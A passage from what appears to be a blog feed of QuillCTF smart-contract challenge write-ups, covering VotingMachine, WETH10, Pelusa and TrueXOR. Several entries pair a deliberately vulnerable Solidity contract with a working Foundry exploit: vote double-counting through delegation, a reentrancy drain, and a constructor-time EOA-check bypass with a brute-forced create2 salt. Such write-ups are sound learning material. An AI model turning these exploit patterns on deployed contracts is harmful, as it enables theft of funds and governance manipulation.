Checkpoint &#123;</span><br><span class="line">        uint32 fromBlock;</span><br><span class="line">        uint256 votes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function _moveDelegates(address from, address to, uint256 amount) internal &#123;</span><br><span class="line">        if (from != to &amp;&amp; amount &gt; 0) &#123;</span><br><span class="line">            if (from != address(0)) &#123;</span><br><span class="line">                uint32 fromNum = numCheckpoints[from];</span><br><span class="line">                uint256 fromOld = fromNum &gt; 0 ? checkpoints[from][fromNum - 1].votes : 0;</span><br><span class="line">                uint256 fromNew = fromOld - amount;</span><br><span class="line">                _writeCheckpoint(from, fromNum, fromOld, fromNew);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (to != address(0)) &#123;</span><br><span class="line">                uint32 toNum = numCheckpoints[to];</span><br><span class="line">                uint256 toOld = toNum &gt; 0 ? checkpoints[to][toNum - 1].votes : 0;</span><br><span class="line">                uint256 toNew = toOld + amount;</span><br><span class="line">                _writeCheckpoint(to, toNum, toOld, toNew);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(uint32 =&gt; Checkpoint)) public checkpoints;</span><br><span class="line">    mapping(address =&gt; uint32) public numCheckpoints;</span><br><span class="line"></span><br><span class="line">    function delegates(address _addr) external view returns (address) &#123;</span><br><span class="line">        return _delegates[_addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegate(address _addr) external &#123;</span><br><span class="line">        return _delegate(msg.sender, _addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function getVotes(address _addr) external view returns (uint256) &#123;</span><br><span class="line">        uint32 nCheckpoints = numCheckpoints[_addr];</span><br><span class="line">        return nCheckpoints &gt; 0 ? checkpoints[_addr][nCheckpoints - 1].votes : 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _delegate(address _addr, address delegatee) internal &#123;</span><br><span class="line">        address currentDelegate = _delegates[_addr];</span><br><span class="line">        uint256 _addrBalance = balanceOf(_addr);</span><br><span class="line">        _delegates[_addr] = delegatee;</span><br><span class="line">        _moveDelegates(currentDelegate, delegatee, _addrBalance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal &#123;</span><br><span class="line">        uint32 blockNumber = uint32(block.number);</span><br><span class="line"></span><br><span class="line">        if (nCheckpoints &gt; 0 &amp;&amp; checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) &#123;</span><br><span class="line">            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);</span><br><span class="line">            numCheckpoints[delegatee] = nCheckpoints + 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation-3"><a href="#Observation-3" class="headerlink" title="Observation"></a>Observation</h2><p>Through the foundrySetup code ,we can see that we have the private key of 4 accounts <code>alice</code> <code>bob</code> <code>carl</code> and <code>hacker</code> . <code>Alice</code> have 1000 vTokens.</p><p>The Objective is Hacker need to have 3000 Votes and 1000 vTokens.<br>We can easily have 1000 vTokens ,but how can we get 3000 Votes.</p><p>we can find <code>delegate</code> function ,it call <code>_delegate</code> and then call the <code>_moveDelegates</code> -&gt; <code>_writeCheckpoint</code>.It can be seen that whenever any user calls <code>delegate</code> function it overwrites the current delegation settings with the new given <code>delegatee</code> address.</p><p>But we can not call this function three times.it does not work.</p><p>After read the contract i found that the <code>getVotes</code> function does not check the <code>checkpoints</code> is valid or not .so we can do simple transfer from four account!!!</p><h2 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.12;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Voting-machine/VotingMachine.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract exploitTest is Test &#123;</span><br><span class="line">    VoteToken vToken;</span><br><span class="line">    address public owner = address(0);</span><br><span class="line">    address public hacker = address(1337);</span><br><span class="line"></span><br><span class="line">    address public alice = address(1);</span><br><span class="line">    address public bob = address(2);</span><br><span class="line">    address public carl = address(3);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.startPrank(owner);</span><br><span class="line">        vToken = new VoteToken();</span><br><span class="line">        vToken.mint(alice, 1000);</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploitVote() public &#123;</span><br><span class="line">        // soluiton</span><br><span class="line">        vToken.delegate(hacker);</span><br><span class="line">        vToken.transfer(bob, vToken.balanceOf(alice));</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        vm.startPrank(bob);</span><br><span class="line">        vToken.delegate(hacker);</span><br><span class="line">        vToken.transfer(carl, vToken.balanceOf(bob));</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        vm.startPrank(carl);</span><br><span class="line">        vToken.delegate(hacker);</span><br><span class="line">        vToken.transfer(hacker, vToken.balanceOf(carl));</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        uint256 hacker_vote = vToken.getVotes(hacker);</span><br><span class="line">        console.log(&quot;Vote Count of Hacker before attack: %s &quot;, hacker_vote);</span><br><span class="line"></span><br><span class="line">        uint256 hacker_balance = vToken.balanceOf(hacker);</span><br><span class="line">        console.log(&quot;Hacker&#x27;s vToken after the attack: %s: &quot;, hacker_balance);</span><br><span class="line"></span><br><span class="line">        assertEq(hacker_vote, 1000);</span><br><span class="line">        assertEq(hacker_balance, 1000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-10.Gate</title>
      <link href="/2024/01/22/QuillCTF-10-Gate/"/>
      <url>/2024/01/22/QuillCTF-10-Gate/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-9.WETH10</title>
      <link href="/2024/01/22/QuillCTF-9-WETH10/"/>
      <url>/2024/01/22/QuillCTF-9-WETH10/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tired of WETH9, we created an overall better version of the commonly used contract, providing a trustless, immutable, and standardized way for smart contracts to abstract away the difference between the native ETH asset and fungible ERC-20 tokens. We call it WETH10, the Messi Wrapped Ether.</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>The contract currently has 10 ethers. (Check the Foundry configuration.) You are Bob (the White Hat). Your job is to rescue all the funds from the contract, starting with 1 ether, in only one transaction.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#123;ReentrancyGuard&#125; from &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &#123;Address&#125; from &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">// The Messi Wrapped Ether</span><br><span class="line">contract WETH10 is ERC20(&quot;Messi Wrapped Ether&quot;, &quot;WETH10&quot;), ReentrancyGuard &#123;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        deposit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burnAll() internal &#123;</span><br><span class="line">        _burn(msg.sender, balanceOf(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable nonReentrant &#123;</span><br><span class="line">        _mint(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 wad) external nonReentrant &#123;</span><br><span class="line">        Address.sendValue(payable(msg.sender), wad);</span><br><span class="line">        _burn(msg.sender, wad);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external nonReentrant &#123;</span><br><span class="line">        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));</span><br><span class="line">        _burnAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Request a flash loan in ETH</span><br><span class="line">    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant &#123;</span><br><span class="line">        uint256 prevBalance = address(this).balance;</span><br><span class="line">        Address.functionCallWithValue(receiver, data, amount);</span><br><span class="line"></span><br><span class="line">        require(address(this).balance &gt;= prevBalance, &quot;flash loan not returned&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>First , i saw the flashloan, but it didn’t work.</p><p>then , i saw this function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function withdrawAll() external nonReentrant &#123;</span><br><span class="line">        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));</span><br><span class="line">        _burnAll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">function _burnAll() internal &#123;</span><br><span class="line">_burn(msg.sender, balanceOf(msg.sender));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so if will transfer it before burn . we can attack it !</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/10-Wthe10/WETH10.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract WETH10Exploit &#123;</span><br><span class="line">    WETH10 weth;</span><br><span class="line">    address payable bob;</span><br><span class="line"></span><br><span class="line">    constructor(WETH10 _weth10, address _bob) payable &#123;</span><br><span class="line">        weth = _weth10;</span><br><span class="line">        bob = payable(_bob);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        for (; address(weth).balance != 0;) &#123;</span><br><span class="line">            weth.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">            weth.withdrawAll();</span><br><span class="line"></span><br><span class="line">            weth.transferFrom(bob, address(this), 1 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success,) = bob.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(success);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        weth.transfer(bob, 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Weth10Test is Test &#123;</span><br><span class="line">    WETH10 public weth;</span><br><span class="line">    address owner;</span><br><span class="line">    address bob;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        weth = new WETH10();</span><br><span class="line">        bob = makeAddr(&quot;bob&quot;);</span><br><span class="line"></span><br><span class="line">        vm.deal(address(weth), 10 ether);</span><br><span class="line">        vm.deal(address(bob), 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testHack() public &#123;</span><br><span class="line">        assertEq(address(weth).balance, 10 ether, &quot;weth contract should have 10 ether&quot;);</span><br><span class="line"></span><br><span class="line">        vm.startPrank(bob);</span><br><span class="line"></span><br><span class="line">        // hack time!</span><br><span class="line">        WETH10Exploit exploit = new WETH10Exploit&#123;value: bob.balance&#125;(weth, bob);</span><br><span class="line">        console.log(&quot;Exploit address: %s&quot;, address(exploit));</span><br><span class="line">        console.log(&quot;Exploit balance: %s&quot;, address(exploit).balance);</span><br><span class="line">        weth.approve(address(exploit), type(uint256).max);</span><br><span class="line">        exploit.attack();</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        assertEq(address(weth).balance, 0, &quot;empty weth contract&quot;);</span><br><span class="line">        assertEq(bob.balance, 11 ether, &quot;player should end with 11 ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-8.Pelusa</title>
      <link href="/2024/01/22/QuillCTF-8-Pelusa/"/>
      <url>/2024/01/22/QuillCTF-8-Pelusa/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“_**You just opened your eyes and are in Mexico 1986; help Diego set the score from 1 to 2 goals for a win, and do whatever is necessary!”**_</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Score from 1 to 2 goals for a win.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">interface IGame &#123;</span><br><span class="line">    function getBallPossesion() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// &quot;el baile de la gambeta&quot;</span><br><span class="line">// https://www.youtube.com/watch?v=qzxn85zX2aE</span><br><span class="line">// @author https://twitter.com/eugenioclrc</span><br><span class="line">contract Pelusa &#123;</span><br><span class="line">    address private immutable owner;</span><br><span class="line">    address internal player;</span><br><span class="line">    uint256 public goals = 1;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function passTheBall() external &#123;</span><br><span class="line">        require(msg.sender.code.length == 0, &quot;Only EOA players&quot;);</span><br><span class="line">        require(uint256(uint160(msg.sender)) % 100 == 10, &quot;not allowed&quot;);</span><br><span class="line"></span><br><span class="line">        player = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isGoal() public view returns (bool) &#123;</span><br><span class="line">        // expect ball in owners posession</span><br><span class="line">        return IGame(player).getBallPossesion() == owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function shoot() external &#123;</span><br><span class="line">        require(isGoal(), &quot;missed&quot;);</span><br><span class="line">                /// @dev use &quot;the hand of god&quot; trick</span><br><span class="line">        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;));</span><br><span class="line">        require(success, &quot;missed&quot;);</span><br><span class="line">        require(uint256(bytes32(data)) == 22_06_1986);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Our Goal is to make goals to 2 .</p><p>To make the goals to 2 , first , we need to call delegatecall() in shoot(). To successful call shoot() function ,we need to pass the require which means we need to let the getBallPossesion() return owner.</p><p>The first vuln is the use of <code>msg.sender.code.length == 0</code> to Vertify wether <code>msg.sender</code> is an EOA,but this check can be byoassed, given that a contract’s codesize is set only at the end of it’s constructor’s execution. This means we can  bypass this check by invoking the <code>passTheBall()</code> function from within the exploit contract.</p><p>The second vuln is in the same function . <code>require(uint256(uint160(msg.sender)) % 100 == 10, &quot;not allowed&quot;);</code>requiring for the sender’s address to have a specified result when interpreted as an integer and it’s modulo 100 is calculated. In combination with the vulnerability found above, it becomes obvious that an attacker must come up with a way to deploy a<br>contract whose address passes this check: I’ve accomplished this by brute-forcing the salt given to <code>create2</code> when determinstically deploying a contract.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;./ppp.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PelusaExploit is IGame &#123;</span><br><span class="line">    Pelusa pelusa;</span><br><span class="line">    uint256 slot1;</span><br><span class="line"></span><br><span class="line">    address pelusaOwner;</span><br><span class="line"></span><br><span class="line">    event Deployed(address);</span><br><span class="line"></span><br><span class="line">    constructor(Pelusa _pelusa, address _pelusaDeployer, bytes32 _pelusaBlockHash) &#123;</span><br><span class="line">        emit Deployed(address(this));</span><br><span class="line">        pelusa = _pelusa;</span><br><span class="line">        pelusa.passTheBall();</span><br><span class="line">        pelusaOwner = address(uint160(uint256(keccak256(abi.encodePacked(_pelusaDeployer, _pelusaBlockHash)))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBallPossesion() external view override returns (address) &#123;</span><br><span class="line">        return pelusaOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handOfGod() external returns (bytes32) &#123;</span><br><span class="line">        slot1++;</span><br><span class="line">        return (bytes32(uint256(22_06_1986)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/7-ppp/PelusaExploit.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PelusaTest is Test &#123;</span><br><span class="line">    Pelusa pel;</span><br><span class="line">    PelusaExploit expl;</span><br><span class="line"></span><br><span class="line">    address pelusaDeployer = makeAddr(&quot;pelusaDeployer&quot;);</span><br><span class="line">    address attacker = makeAddr(&quot;attacker&quot;);</span><br><span class="line"></span><br><span class="line">    function testFindCreate2Salt() external &#123;</span><br><span class="line">        vm.prank(pelusaDeployer);</span><br><span class="line">        pel = new Pelusa();</span><br><span class="line"></span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        for (uint256 i; i &lt; 1000; ++i) &#123;</span><br><span class="line">            vm.expectRevert();</span><br><span class="line">            emit log_uint(i);</span><br><span class="line">            expl = new PelusaExploit&#123;</span><br><span class="line">                salt: bytes32(uint256(i))</span><br><span class="line">            &#125;(pel, pelusaDeployer, blockhash(block.number));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() external &#123;</span><br><span class="line">        vm.prank(pelusaDeployer);</span><br><span class="line">        pel = new Pelusa();</span><br><span class="line"></span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        /* In a real world scenario, an attacker is able to retrieve the deployer&#x27;s address and the block.number at which the Pelusa</span><br><span class="line">        contract was deployed, effectively reconstructing the `owner` address and passing the `isGoal()` check.</span><br><span class="line">        */</span><br><span class="line">        expl = new PelusaExploit&#123;</span><br><span class="line">            salt: bytes32(uint256(39)) // salt value 39 was found by brute forcing the create2 address pre computation in the above test</span><br><span class="line">        &#125;(pel, pelusaDeployer, blockhash(block.number));</span><br><span class="line">        pel.shoot();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        assertEq(pel.goals(), 2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-7.TrueXOR</title>
      <link href="/2024/01/22/QuillCTF-7-TrueXOR/"/>
      <url>/2024/01/22/QuillCTF-7-TrueXOR/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“This challenge is all about eXclusive OR, and you know what that means, right?”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Make a successful call to the <code>callMe</code> function. </li><li>The given <code>target</code> parameter should belong to a contract deployed by you and should use <code>IBoolGiver</code> interface.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IBoolGiver &#123;</span><br><span class="line">  function giveBool() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrueXOR &#123;</span><br><span class="line">  function callMe(address target) external view returns (bool) &#123;</span><br><span class="line">    bool p = IBoolGiver(target).giveBool();</span><br><span class="line">    bool q = IBoolGiver(target).giveBool();</span><br><span class="line">    require((p &amp;&amp; q) != (p || q), &quot;bad bools&quot;);</span><br><span class="line">    require(msg.sender == tx.origin, &quot;bad sender&quot;);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>To solve this question we somehow have to return different booleans in the same transaction on the view function. So it is not possible to change any state variable to control it and return something else using that state variable.</p><p>If we check solidity official document for <a href="https://docs.soliditylang.org/en/v0.8.11/units-and-global-variables.html#block-and-transaction-properties">Block And Transaction Properties</a> we can see there are 15 different transaction properties exist.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero</span><br><span class="line">block.basefee (uint): current block’s base fee (EIP-3198 and EIP-1559)</span><br><span class="line">block.chainid (uint): current chain id</span><br><span class="line">block.coinbase (address payable): current block miner’s address</span><br><span class="line">block.difficulty (uint): current block difficulty</span><br><span 